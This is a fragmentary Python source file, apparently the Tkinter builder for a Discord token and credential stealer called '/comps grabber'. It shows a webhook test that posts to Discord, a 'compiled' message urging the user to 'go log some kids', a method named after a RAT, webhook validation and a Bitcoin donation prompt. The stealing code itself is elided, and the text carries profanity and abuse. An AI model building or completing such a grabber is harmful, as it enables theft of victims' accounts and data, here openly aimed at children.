#fully fucking skidded by escrow#0001 kys dawg
...
window = Tk()
window.title("/comps grabber | escrow#0001")
...
""")
        ...
        webhook.execute()
        messagebox.showinfo("/comps grabber || @escrow#0001","Grabber Successfully Compiled. Go log some kids now bitch")
        Menu()
...
class Menu:
    ...
    def _vespyRAT(self):
        webbrowser.open("https://discord.gg/comps")
    ...
    def _testhook(self):
        ...
        try:
            ...
            embed = DiscordEmbed(title=f"/comps grabber", description=f"Webhook Working :white_check_mark:", color='4300d1')
            embed.set_author(name="author : escrow", icon_url=r'https://cdn.discordapp.com/attachments/1037900641164611659/1052760729196970125/forvespyservero.png')
            embed.set_footer(text='/comps grabber | by : escrow')
            embed.set_timestamp()
            webhook.add_embed(embed)
    ...
    def _verification(self):
        if len(self.webhook.get()) < 5:
            messagebox.showerror("/comps grabber || @escrow#0001","Webhook too short idiot")
        else:
            try:
    ...
    def _btc(self):
        ...
        messagebox.showinfo("/comps grabber || @escrow#0001","BTC Address Copied, ty <3")
